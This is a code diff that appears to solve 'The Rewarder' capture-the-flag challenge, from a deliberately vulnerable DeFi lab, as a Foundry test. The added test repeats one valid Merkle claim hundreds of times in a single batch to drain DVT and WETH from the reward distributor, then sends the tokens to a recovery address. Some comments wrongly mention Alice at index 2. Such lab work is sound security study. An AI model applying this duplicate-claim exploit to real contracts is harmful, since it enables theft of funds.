@@ -148,7 +148,58 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        // first have to check if player is among the beneficiaries
+        console.log(player); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C  
+        // ctrl + f, and search in the json file of beneficiaries
+        // for weth at index = 188
+        // {
+        //     "address": "0x44E97aF4418b7a17AABD8090bEA0A471a366305C",
+        //     "amount": 1171088749244340
+        // },
+
+        // for DVT at index = 188
+        // {
+        //     "address": "0x44E97aF4418b7a17AABD8090bEA0A471a366305C",
+        //     "amount": 11524763827831882
+        // },
+
+        // Set DVT and WETH as tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
         
+        // Calculate roots for DVT and WETH distributions
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        Claim[] memory claims = new Claim[](1720);
+
+        // First, the DVT claim
+        claims[0] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: 11524763827831882,
+            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+            proof: merkle.getProof(dvtLeaves, 188) // Alice's address is at index 2
+        });
+        for(uint256 i = 1; i < 867; i++) {
+            claims[i] = claims[0];
+        }
+
+        // And then, the WETH claim
+        claims[867] = Claim({
+            batchNumber: 0, // claim corresponds to first WETH batch
+            amount: 1171088749244340,
+            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+            proof: merkle.getProof(wethLeaves, 188) // Alice's address is at index 2
+        });
+        for(uint256 i = 868; i < 1720; i++) {
+            claims[i] = claims[867];
+        }
+        distributor.claimRewards(claims, tokensToClaim);
+        uint256 balanceOfDVT = IERC20(address(dvt)).balanceOf(player);
+        uint256 balanceOfWETH = IERC20(address(weth)).balanceOf(player);
+        dvt.transfer(recovery, balanceOfDVT);
+        weth.transfer(recovery, balanceOfWETH);
     }
 
     /**
@@ -182,7 +233,7 @@ contract TheRewarderChallenge is Test {
         Reward[] memory rewards =
             abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
         assertEq(rewards.length, BENEFICIARIES_AMOUNT);
-
+        
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
